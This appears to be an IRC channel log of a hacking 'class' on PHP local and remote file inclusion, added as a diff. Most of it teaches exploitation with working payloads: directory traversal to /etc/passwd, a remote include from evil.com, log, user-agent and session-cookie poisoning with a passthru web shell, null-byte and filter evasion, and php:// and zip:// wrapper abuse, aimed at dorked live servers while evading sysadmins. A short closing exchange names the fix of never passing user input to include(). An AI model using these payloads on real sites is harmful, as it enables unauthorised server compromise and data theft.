@@ -1,0 +1,640 @@
+<&rackham> logging is on
+<&rackham> as of now
+<&mona> ok
+<&mona> the local/remote is based on whether you're able to include files from other servers
+<&mona> or just the one you're exploiting
+<&mona> either way, it's an injection vulnerability
+<&mona> that takes advantage of unsanitized parameters 
+<&mona> it can lead to arbitrary access to files, and when the stars are right it can also be a direct avenue to a shell
+<&mona> so
+<&mona> lfi/rfi actually isn't PHP-specific
+<&mona> any scripting engine that lets you dynamically include content could be vulnerable
+<&mona> and any scripting engine that lets you evaluate dynamically loaded content could be vulnerable to the RCE side of it
+<&mona> in practice, though PHP is the flagship for this kind of vuln
+<&mona> basically, the root of this vulnerability is usually the include() or require() PHP functions
+<&mona> who can tell me what include() and require() do
+< overfl0w> include another file
+< overfl0w> require a file
+< kashloca> it include a php file
+< k3x0> includes local or remote files into your project
+< kashloca> i another one
+< Neo> require a file
+< cyb3rs3c> ^^
+<&mona> correct
+< Neo> Like ftp?
+<&mona> not like ftp
+<&mona> php is a scripting engine
+<&mona> the include() and require() functions allow you to include other scripts
+<&mona> or any other text
+<&mona> in the body of your webpage
+<&mona> include() and require() have some differences but for LFI they're functionally the same thing
+<&mona> namely, a function that allows you include arbitrary files
+<&mona> in the body of a webpage
+<&mona> the simplest most hackneyed example of vulnerable code would be something like this:
+<&mona> let's say you have a file, index.php, which includes the following code
+<&mona> <?php
+<&mona> 	include($_GET['file']);
+<&mona> ?>
+<~kr0> leet
+<&mona> you set this up so you can have a single php page that includes a variety of text files
+<&mona> instead of making a separate page for each document
+<&mona> look how clever you are
+<&mona> however, php doesn't have any built-in sanitization of that parameter
+<&mona> or the usage of that function
+<&mona> so what happens when someone navigates to /index.php?file=../../../../../../../../../../etc/password
+<&mona> you can easily traverse directories and gain read-access to any file that the user running the PHP server has access to
+<&mona> the remote version is even more easily exploitable
+<&mona> with remote file inclusion, a parameter that is disabled by default in PHP is switched on
+<&mona> which is fairly rare
+<&mona> but when you find it, the include() and require functions can be any source at all, even remote webpages
+<&mona> so you could for example do
+<&mona> /index.php?file=http://www.evil.com/evil.php
+<&mona> and your hosted PHP code would be downloaded and run server-side
+<@anonymous> and your shell is uploaded
+<&mona> ^
+<&mona> direct path of shell
+<&mona> but like I said, pretty rare in moder times
+<&mona> LFI is much more command
+<&mona> common*
+<&mona> which means you're usually working with file read access to begin with
+< overfl0w> pwnage
+<&mona> does everyone understand how this works so far?
+< overfl0w> aye
+< fsociety> mona
+< cyb3rs3c> pretty much yes
+< R3lcr4w> yes
+< aediot> ye
+< Freenaught008> quick question. How do you get the password directory? spider?
+< ghost0ne> yes
+< redevil> is shell from LFI possible ?
+<&mona> yes
+<&mona> i will get to that
+< fsociety> i dont get how uploading the site can give the shell
+< xerxes> Freenaught008: if oyu know it's vulnerable to LFI, you can just keep going back a directory until you find it
+<&mona> fsociety: if you ca upload PHP code so the site
+< Winning> You get into the files then use those as a foothold to search directories?
+< overfl0w> better to get /etc/shadow
+<&mona> you can us eval(), exec() or any other PHP code evaluation to run
+< kashloca> how the code would be executed from another server
+<&mona> which gives you direct shell access
+< kashloca> for rfi
+< fsociety> ok i got it thx
+<&mona> /index.php?file=http://www.evil.com/evil.php
+< Freenaught008> /etc/shadow is only for lunix I though? what about a windows web server?
+< xerxes> mona: that would be RFI
+<&mona> yes
+<&mona> responding to kashloca
+< thr33> iiuc wold we have to get the index.php and evaluate it for includes?
+< cyb3rs3c> understood.
+< Winning> So PHP is like an easy foothold into files?
+<&mona> "PHP" isn't
+<&mona> but shittily programmed PHP is
+< overfl0w> iis is so easy to exploit
+<&mona> and i should reiterate
+<&mona> as i said before, PHP is the most famous
+<&mona> but far from the only technology vulnerable to this
+<&mona> any scripting engine used for webapps is potentially vulnerable
+<&mona> that includes ruby, nodejs or anything js-based, python, etc.
+<&mona> anyway, as you can imagine fuzzing for PHP is very easy
+<&mona> and one of the reasons PHP is popular for skids to look for is that the fuzz is the same as SQLI
+<&mona> just stick a string-breaking character like ' in there
+<&mona> if you get an error
+<&mona> especially something along the lines of "failed to open stream"
+<&mona> you have yourself an LFI injection
+<&mona> you're testing to see whether your input is directly evaluated as a filename for the include()/require() functions
+<&mona> anyway
+<&mona> i promised RCE
+<&mona> so the way you can leverage LFI->RCE
+<&mona> is by remembering that you don't just have the power to READ files
+<&mona> you have the power to EXECUTE files
+<&mona> so if there is any PHP code in any accessible file on the system
+<&mona> you can include that code
+<&mona> and it will execute
+<&mona> sometimes this is really, really easy to exploit
+<&mona> for example, if the site has a simple file upload
+<&mona> and you can just upload and include your PHP code directly
+<&mona> then it's simply a matter of locating and including your uploaded PHP
+<&mona> when there isn't a direct route, it's often still possible
+<&mona> all you need to do is get your code into the target system
+<&mona> by any means necessary
+<&mona> in any format necessary
+<&mona> and then you can execute it
+<&mona> mostly you'll do this by exploiting the webserver's logging functionality
+<&mona> or some other service running that logs or allows you to enter input that will be saved somewhere
+<&mona> i'll go over a few of the more common ways to do that
+<&mona> so
+<&mona> let's say you have an Apache server running PHP
+<&mona> you've tested for LFI and found a vuln, you can now include() any file on the system
+<&mona> what do you do next?
+< overfl0w> iupload my shell code
+< AnonRoot> you could try and upload a shell to get root
+< redevil> shell ...  shell .... shell ...
+< torc> get the shell?
+< Winning> ^
+< Neo> Upload a shell code?
+< Moise> www.exaple.com/..../../etc/upload
+<&mona> how
+<&mona> how will you upload it?
+<&mona> this system has no upload function
+<&mona> how do you get your shell onto the system
+< thr33> verify access to the directory structure
+< Moise> admin panel?
+< Neo> I upload the code from my host page to that page?
+< kashloca> test if i can execute shell within include()??
+< overfl0w> index.php?include="path.to.file"
+< redevil> just like you said, simple shell code in url
+< kashloca> to create a file
+< redevil> it'll get logged
+<&mona> yes
+<&mona> some of you are on the right track but don't have a full understanding
+<&mona> but redevil is essentially right
+<&mona> let's say you just straight up
+<&mona> $ telnet fuckwith.com 80
+<&mona> and then make a get request
+<&mona> GET <? passthru($_GET['cmd']); ?> HTTP/1.1
+<&mona> that throws up an error obviously
+<&mona> it's not a valid HTTP request
+<&mona> but your objective was to get that string logged
+<&mona> now that it's been logged, that string is somewhere on their filesystem
+<&mona> in the case of apache it's probably somewhere like /var/log/access.log or /var/log/error.log
+<&mona> so now you have a log file that include your php shell
+<&mona> you just include it
+<&mona> fuckwith.com/index.php?file=../../../../../../../../var/log/access.log?cmd=whoami
+<&mona> fuckwit*
+<&mona> and, as redevil said
+<&mona> other stuff like throwing it in the browser as part of an URL
+<&mona> anything that causes your string to be loaded onto the server
+<&mona> a lot of these should be fairly obvious
+<&mona> putting your code in POST/GET params, sending it to random telnet ports, etc.
+<&mona> but one that gets passed over a lot is user agent/cookie injection
+<&mona> so i'll draw some attention to that
+<&mona> you can't always guarantee what will be logged, and maybe your telnetting isn't producing a log anywhere you can access
+<&mona> there is one file you can include, however, that you have almost direct control over
+<&mona> /proc/self/environ
+<&mona> this is a file that contains information about the connected session
+<&mona> (that's you)
+<&mona> so whatever your user-agent is
+<&mona> that's stored in /proc/self/environ
+<&mona> what happens if you use a freely available browser extension
+<&mona> to change your user-agent to <?php passthru($_GET['cmd']); ?>
+<&mona> now that string is in /proce/self/environ after you connect
+<&mona> and you do
+<&mona> /index.php?file=../../../../../../proc/self/environ
+< redevil> include() doesn't need a .php file ? it'll process php code in .log too ?
+< overfl0w> intersting shit, mona
+<&mona> you can set it not to do so
+<&mona> but by default, correct
+<&mona> the include() allows you to include any file
+<&mona> some developers try to force a php file with shitty firewalls and whitelists
+<&mona> which we're about to cover
+< Linux777> its syntax include(file);  ?
+< kashloca> u can use php4
+< kashloca> for that to avoit shitty firewalls
+<&mona> correct
+< Linux777> sorry because i'm late :D 
+< Moise> A question
+< yetan0theruser> Do frameworks try to block those kinds of things ?
+< thr33> i just got lost, not sure how it would be fetched in the includes because the log file will have other entries for the access and error logs
+<&mona> doesn't matter
+< Moise> Can you show us it live
+< Winning> ^^
+<&mona> PHP allows you to mix PHP and HTML
+< Freenaught008> just saying. This is the most amazing thing ever. I've been missing out on IRC greatness for years......
+< overfl0w> bingo
+<&mona> which means the non-php code
+< shellcode> ^
+<&mona> will just be formatted as text in your browser
+<&mona> whereas the PHP code will be executed
+<&mona> so if you fetch access.log, and it has your PHP code in
+<&mona> the PHP code executes
+<@anonymous> push and pull
+<&mona> ^
+< cyb3rs3c> hmm oke
+< thr33> freaking awesome, the text will show but the php executes since its in the format
+< Winning> Can you get tracked easily if you do this?
+<&mona> exactly
+<&mona> Winning: this is hacking
+< Winning> I know
+<&mona> you are directly connecting to a website
+<&mona> as with any form of hacking, you should take all precautions
+< aediot> lol
+< fsociety> that requires however a vulnerable site with somethink like sql error etc?
+< Winning> So you would use TOR, right?
+<&mona> fsociety: it is its own class of vulnerability
+< Freenaught008> torify, vpn, RDP.
+<&mona> it's very similar to an SQLI
+< Linux777> mona have you  examples about that ?
+<&mona> it's an injection vuln
+< kashloca> is there anyway to determine from errors
+< fsociety> i see
+<&mona> but instead of injecting database queries
+<&mona> you are injecting PHP code
+< kashloca> the site is vulnerable to lfi like the open stream error
+<&mona> kashloca: you can fuzz with a single quote
+<&mona> yes
+<&mona> in some cases filter evasion might be necessary
+<&mona> and the basic LFI fuzz will not work
+<&mona> i'll get to that momentarily 
+<&mona> first i want to quickly cover one more vector
+<&mona> you've probably got the impression by now that there's various ways of exploiting PHP LFI and some will/won't work on each system depending on their config
+<&mona> so it's good to stockpile a few techniques
+<&mona> i've showed you how to get your code in the apache logs with a telnet request, and how to use /proc/self/environ to include your user-agent
+<&mona> one final technique:
+<&mona> cookie injection
+<&mona> if you've verified that the site is storing cookies from your machine
+<&mona> try and find out where they're stored
+<&mona> usually /tmp is the place to go
+<&mona> i.e.
+<&mona> fuckwith.com      PHPSESSID=74781270ffbead
+<&mona> if you already have a cookie, you'll want to change it so the server creates a new "cookie jar"
+<&mona> then inject your code into the URL:
+<&mona> fuckwit.com/<?php passthru($_GET['cmd']); ?>
+<&mona> this won't do anything obviously
+<&mona> but the request you made
+<&mona> will be stored in your cookie jar
+<&mona> so all you need to do is include() the file that corresponds to your cookie
+<&mona> i.e.
+<@anonymous> just think if you stored that permanently on the site through something like xss :X
+<&mona> /index.php?file=../../../../../../../../../tmp/sess_74781270ffbead
+<&mona> since your cookie file includes the request, your PHP code can be found in there
+<&mona> which means that you have found yet another way in which to execue your shell
+<&mona> still with me?
+<&mona> it's ok to ask questions, kids
+< overfl0w> yup yup
+< R3lcr4w> yes
+< AnonRoot> yup
+< Linux777> yes yes :D
+< aediot> yer
+< CyBeR_pHrEaK> yep
+< ghost0ne> yes
+<&mona> cool
+< qweanon> yea...lil bit
+<&mona> if you followed the other two
+< yetan0theruser> Wasn't that how the spanish guy hacked the police?
+<&mona> this should make sense
+< kashloca> yeas
+<&mona> it's just another way of affecting the filesystem
+< overfl0w> actualy I do have to jet but very intersting stuff, mona..
+< kashloca> yes
+<&mona> and giving you a file to include()
+<&mona> overfl0w: <3
+< redevil> whats more commonly found in sites , SQLi or LFI ?
+< kashloca> everything is good
+< Winning> I'm good for now :P
+<&mona> redevil: sqli is a bit more common maybe
+< overfl0w> afk
+<&mona> if only because PHP isnt as popular as it once was
+<&mona> but sql is going strong
+<&mona> but both are common
+<&mona> sqli and lfi are THE skid's first hack
+<&mona> and were, for the record, my first hacks as well
+<&mona> they're low hanging fruit
+<&mona> and both are incredibly common
+<&mona> especially on shitty sites
+< redevil> same goes for me then :P
+< ufurnace> lfi is also a lot harder now that PHP doesn't have the null byte poisoning problem
+< kashloca> it's like 
+< kashloca> the revslider shit in wordpress
+< kashloca> 2 years ago
+<&mona> for an idea of how common it really is 
+<&mona> https://www.exploit-db.com/google-hacking-database/?action=search&ghdb_search_cat_id=0&ghdb_search_text=php+file+inclusion
+<&mona> ufurnace: true, although it's still very doable
+<~kr0> mona, when ur done pls hilight me 
+<&mona> and a shitload of servers are not patched
+<&mona> kk
+<~kr0> I need to clean the chan
+<~kr0> thx
+< ufurnace> mona: Absolutely, there are technques :)
+<&mona> anyway, yeah
+<&mona> try any of those dorks
+<&mona> and you'll see the sheer quantity of servers sitting out there
+<&mona> just waiting to be hacked
+< fsociety> some already are :p
+<&mona> i guarantee 90% of them are already shelled and rooted
+<&mona> ^
+< fsociety> like most of them
+<&mona> if the dork has appeared on GHDB
+<&mona> someone's probably written a script to crawl and autopwn them
+<&mona> this is how shitty herders make their first botnet
+< Neo> ,
+< Neo> Mona
+< kashloca> ah okay
+< redevil> still good to practice though 
+<&mona> what
+<&mona> definitely
+< Neo> Can we get access to the shell script that other hackers write on that webpages?
+< Winning> So say I have a website
+< Neo> Sorry for my bad english btw
+<&mona> and just because the GHDB are hacked to shit doesnt mean there aren't big-time apps that have this problem
+<&mona> Neo: yes
+< Linux777> mona any exemple about that ? a code source for exemple ?
+<&mona> if someone else has shelled a server
+< Winning> Just for recap for me because I, before coming here, knew squat
+< Neo> How?
+<&mona> and you get LFI on it, you can read their shell
+<&mona> assuming it isn't kittd
+< Winning> How do I check if it uses PHP
+< Winning> or LFI
+<&mona> look for the .php extension
+<&mona> that's a good bet
+<&mona> and i spent the whole lessoning explaining how to find lfi
+<&mona> that's what this lesson is about
+< xerxes> X-Powered-by: PHP
+< xerxes> in http headers
+<&mona> ^
+< Winning> K
+< Winning> ty
+< cyb3rs3c> what is the right way of probing to find lfi/rfi ?
+<&mona> as i said earlier
+<&mona> it's similar to sqli
+<&mona> you're fuzzing for the same vuln
+<&mona> often a simple single quote
+< cyb3rs3c> just trying a bunch off shit /
+<&mona> in get params
+<&mona> or post params
+<&mona> is enough to give you an error
+<&mona> and indicate that your data is being directly processed
+<&mona> without sanitization or parameterization
+< ufurnace> I suggest using ../../../../../../etc/passwd first
+< cyb3rs3c> oke
+< ufurnace> It's a bit more reliable than errors not being handled
+<&mona> either way
+< redevil> never trust the url extensions though, I used a famework and replaced all .php with .net in my websites :P
+<&mona> going for etc/passwd right at the beginning is a bit noisy
+<&mona> if a simple ' woul detect it
+<&mona> more likely to be noticed
+< ufurnace> That's true
+<&mona> which is something to bear in mind if you are performing a concerted attack against a single target
+<&mona> rather than just trolling for shells
+<&mona> you want their sysadmin to be in the dark for as long as possible
+< cyb3rs3c> well thank you very much for this lesson mona, i feel the power surging in my asshole
+< ufurnace> You might consider ../../../../etc/hosts instead
+<&mona> good
+<&mona> now
+<&mona> a few last things to cover
+<&mona> as I said, very often shitty PHP code comes complete with shitty santization
+<&mona> so sometimes you get a site that is obviously vuln to LFI, but it's not working as it should
+<&mona> nine times our of then, this is a shit-tier WAF that is filtering or blacklisting your input
+<&mona> wat
+<&mona> nine times out of ten*
+<&mona> and nine times out of ten, you can evade it with some though
+<&mona> as ufurance noted, the null byte problem is fixed in the latest version of PHP
+<&mona> but it still works on a lot of sites
+<&mona> basically a common measure is to only allow php files to be included
+<&mona> (which is a stupid way to solve the problem of LFI VULNERABILITY)
+<&mona> so they'll do something like
+<&mona> add ".php" to the end of your parameter
+<&mona> so if you do ../../../../../.../../etc/passwd
+<&mona> it will include /etc/passwd.php
+<&mona> which obviously doesnt exist
+<&mona> this is easy enough to bypass on systems where it's possible, though
+<&mona> all you need is a null byte, %00
+<&mona> /index.php?file=../../../../../../../../../../etc/passwd%00
+<&mona> then you include /etc/passwd%00.php
+<&mona> since %00 signifies the end of a string, the .php is dropped off
+<&mona> leaving you with /etc/passwd
+<&mona> there's a lot of other stuff like this
+<&mona> another amateurish thing to do
+<&mona> is to filter out "../"
+<&mona> so if they see you trying to traverse directories with ../, they'll drop your connection or filter it out
+<&mona> but ..%2F often works
+<&mona> (%2F = "/" in url-encoded ascii)
+<&mona> or if they filter that, you can try doing something like
+<&mona> ..././
+<&mona> if their filter isn't recursive, they filter out the "../" from the middle of that
+<&mona> leaving you with "../" afterwards
+<&mona> because if you remove the 2nd to 4th characters of that string
+<&mona> what you're left with is actually the string you originally wanted to send
+<&mona> play around with encoding and mutating various parts of your injection
+<&mona> try variable case if specific words are filtered out
+<&mona> i.e. eTc/paSsWoRd
+<&mona> a lot of the principles that apply to SQLi WAF invasion
+<&mona> evasion*
+<&mona> also apply here
+<&mona> in fact, almost all of them do
+<&mona> anyway
+<&mona> for the final segment
+<&mona> you've just got LFI on a system
+<&mona> maybe you have code execution, maybe you don't
+<&mona> you want to know which files to read
+<&mona> there are always the basics:
+<&mona> /etc/passwd
+<&mona> /etc/group
+<&mona> /etc/security/passwd
+<&mona> /usr/local/apache/conf/httpd.conf
+<&mona> as i said before
+<&mona> /proc/self/environ contains the user-agent, which means you can inject code with it
+<&mona> /proc/self/fd/<number> can also be iterated through
+<&mona> until you find a running process
+<&mona> likewise with /proc/<pid>/fd/<number>
+<&mona> and /proc/self/cmdline contains info on running programs
+<&mona> for logs:
+<&mona> look in
+<&mona> ./apache/logs/
+<&mona> /var/lo
+<&mona> /var/log*
+<&mona> /var/apache
+<&mona> /usr/local/httpd/logs
+<&mona> ./err.log, ./access.log
+<&mona> etc
+<&mona> that's the end of the lfi crash course
+<&mona> questions?
+< NullMind> no
+< thr33> besides reading random, any recommended reading
+< NullMind> sounds good
+< kashloca> no
+< Freenaught008> mona, will you be around for a bit. I have a few questions, but its not about lfi
+< AnonRoot> no
+< kashloca> thanks 
+< Winning> What if the website has a root like, say its something stupid like portaportal which I'm sure you're all farmilar with, where people make their own websites on the root website. How would this work for those sites? 
+< fsociety> mona where do we get the output after lfi?
+< torist> is it possible to find these vulns using github dorks? 
+< FreeDom> thanks mona
+<&mona> fsociety: 
+<&mona> the include() includes the file in the page
+<&mona> so youl will see its output on the page you're injecting
+< fsociety> ah ok
+<&mona> it's possible it's commented or otherwise invisible, so also check the source
+< Linux777> mona all of that is in linux ? can i do that in windows ?
+< Freenaught008> also, you guys dont mind if I save this right?
+<&mona> yes, Linux777 
+< webanon> yes transcripts?
+<&mona> the fault is in PHP itself
+< Winning> I took notes not transcripts
+<&mona> windows has different files and folders
+<&mona> but the principle is the same
+<&mona> kr0: pinging you for logs
+<~kr0> rackham, logged
+<&mona> Freenaught008: the point of this is to disseminate information
+< k3x0> clr = kernal same same
+< webanon> @wining sorry just got here, had to work late
+< Linux777> ah ok thanks :D 
+< shellcode> thanx for that lesson good shit
+<&mona> save it, print it on every printer on your school graffiti it onto a wal
+<&mona> idgaf
+< cyb3rs3c> yeah thank you
+< qweanon> thanks any recomnded readings ?
+<&mona> no probs
+< cyb3rs3c> i will save it
+< Winning> I can save this real fast
+<&mona> qweanon: in general
+<&mona> or about LFI
+< NullMind> mona: yes owasp
+< webanon> yeah recommended readings?
+< NullMind> woops
+< qweanon> about lfi specifically
+< Tech-Know> mona: did you go over how you'd recommend to sanitize the user input if you were building such a site? i joined late
+< NullMind> wrong tag
+< redevil> thanks for the session mona
+< Tech-Know> or would a fixed list just be a better idea?
+< Winning> thanks moma
+< ufurnace> Tech-Know: Ultimately you don't ever want to put user input into a call to include()
+< Winning> *len*
+<&mona> sanitization is not the answer
+<&rackham> just in time to jill logs
+< kashloca> lool
+<&mona> as ufurnace says
+< ufurnace> IF you must, fixed list
+<&mona> the fundamental security problem
+< Tech-Know> fair enough
+< kashloca> thanks moma wtg
+<&mona> is directly processing user input
+< kashloca> wtf
+< thr33> thanks alot for the info mona, i learned so much shit in this 
+              time than some of the reading i've done
+<&mona> as an argument to an include() call
+<&mona> that's ok
+<&mona> if anyone is having throuble grokking it
+< Winning> rip my mispelling
+<&mona> try reading over the logs when they're released
+< yetan0theruser> mona: do modern frameworks such a laravel try and 
+                       prevent this? Or it just comes down to pajeet 
+                       developers?
+<&mona> it's actually not that complicated
+< Winning> Mona one thing 
+< webanon> k
+< cyb3rs3c> learned more here then in school 2 years
+< NullMind> thr33: now put to practice
+< Winning> What if the website has a root like, say its something stupid 
+                like portaportal which I'm sure you're all farmilar with, 
+                where people make their own websites on the root website. How 
+                would this work for those sites? 
+< thr33> i'm boiling and drinking the tea
+< Winning> You never really answered this I don't think
+<&mona> Winning: are you talking about shared hosting
+<&mona> yetan0theruser: depends
+<&mona> some leave it up to the end user
+<&mona> some do protection and firewalling
+<&mona> not familiar with laravel
+< overfl0w> back and read the rest
+< yetan0theruser> aight thanks
+< Winning> Yeah shared hosting
+< overfl0w> this is why I run modsec lol
+< cyb3rs3c> fuck the top is gone already
+<&mona> you basically get access to the user account and privileges
+<&mona> of the account running the webserver
+< cyb3rs3c> top of the class >.<
+<&mona> which is usually some kind of webroot account
+< Winning> Oh cool
+<&mona> on shared, hosting
+< Winning> Alright
+<&mona> it's theoretically possible
+< Parabole> thank you for the class Mona
+< Winning> ^^
+<&mona> depends on the shared host
+<&mona> often a user on a shared host
+< Winning> Free stuff is less secure
+<&mona> will be in a chroot jail or a vm
+< Winning> I know that
+< overfl0w> mona: How do you tell is a server is LFI or RFI vuln
+< user_two> what if the include function on the page is adding a 
+                 directory name before the file it is including
+<&mona> so it comes down to whether you can breakout into the webhost
+< Linux777> mona on windows which files and folders are ?
+< Linux777> for exemple
+< Freenaught008> Thanks for the class, for reals. It really helps to 
+                      learn like this. 1000 thanks!
+<&mona> overfl0w: as I said multiple times, try fuzzing with a single 
+             quote ' or just try injecting e.g. 
+             ..%2F..%2F..%F..%2F..%2f..%2Fetc%2Fpasswd
+<&mona> Linux777: for example
+<&mona> ../../../../../../../../../../WINDOWS/ntusers.dat
+< overfl0w> Thanks, sorry I missed that part
+<&mona> that's ok
+< Winning> Just found me my first website
+< Winning> TO TOT
+< Winning> *TOR
+< ufurnace> mona: I missed the part with RFI, came in a bit late. Did you 
+                 cover alternative URI handlers?
+< webanon> Winning just make sure it aint mine lol
+<&mona> i did not
+<&mona> wanna drop some knowledge real quick?
+< ufurnace> Sure, why not?
+< R3lcr4w> yeah please do it
+<&mona> i skipped over RFI because i don't see it much anymore
+< ufurnace> Yeah, it's true, it's rare
+<&mona> ok extra credit time
+<&mona> ufurnace has a final note on RFI for you
+<%ufurnace> A URI handler is whatever takes care of getting the resource 
+                 a URI points to
+<%ufurnace> Mostly what you see is http://
+<%ufurnace> or https://
+<%ufurnace> But if you look at the PHP documentation, that's not all that 
+                 works
+<%ufurnace> http://php.net/manual/en/wrappers.php
+<%ufurnace> I'll go over the most interesting ones
+<%ufurnace> php:// is by far the most interesting
+<%ufurnace> It does a series of custom things
+<%ufurnace> For instance, php://input is simply a pseudo-file that 
+                 contains the POST body of the request you've just made
+<%ufurnace> So if you have a server that simply takes your input, 
+                 interprets it as a URL and includes it but doesn't allow any 
+                 outbound requests whatsoever
+<%ufurnace> And furthermore doesn't allow for any of the LFI exploitation 
+                 technique mona mentioned
+<%ufurnace> php://input allows you to just put <?php phpinfo() ?> in the 
+                 POST body of your request using Burp or whatever else
+<%ufurnace> And that's what will be included
+<%ufurnace> Let's say you have file upload, but can't upload any .php 
+                 files
+<%ufurnace> And you also have '.php' appended to your input
+<%ufurnace> You can upload a zip file with a php file in it
+<%ufurnace> And use zip://path/to/zipfile.zip#thephpfile
+<%ufurnace> Which will then open up thephpfile.php from zipfile.zip
+<%ufurnace> It even works if the zip file isn't named .zip
+<&mona> such a fun vuln, shame it's so rare
+<%ufurnace> So if you can only upload .jpg files, you can rename your 
+                 zipfile.zip to zipfile.jpg and this technique still works
+<%ufurnace> mona: very true
+<%ufurnace> Last thing I want to mention is php://filter
+<%ufurnace> This is useful if you want to get the source of PHP files, 
+                 not include them
+<%ufurnace> php://filter allows you to perfom some transforms on the file 
+                 you're opening
+<%ufurnace> For instance, base64 encoding
+<%ufurnace> I always forget the syntax so I'd have to google it, but 
+                 basically you can open some php code file, wrap it in base64 
+                 encoding, and then include it, which will spit it out without 
+                 processing
+<%ufurnace> This can be useful for finding other bugs, getting 
+                 credentials from sources, config files, etc
+<&mona> ^
+<&mona> bypasses one of the advantages of PHP, i.e. no one can see your 
+             source
+<%ufurnace> Or simply finding the location where something like a file 
+                 upload occurs so you know where to point for a successful LFI
+<%ufurnace> That's all I've got for now :)
+<&mona> alright
+< fsociety> good man really nice
+<~kr0> ok great , thanks ufurnace 
+<%ufurnace> I'll be doing an advanced web app exploitation class on 
+                 Sunday if you're interested
+< Linux777> thank you mona and ufurnace :D
+<&mona> look forward to ufurnace's sunday lesson on advanced epxloitation
+<&mona> ^
+< AnonRoot> good information
+< fsociety> ofcourse ufurnace
+< Parabole> thank for extra
+< R3lcr4w> great thanx
+< Winning> Hey Mona
+<&mona> CLASS DISMISSED
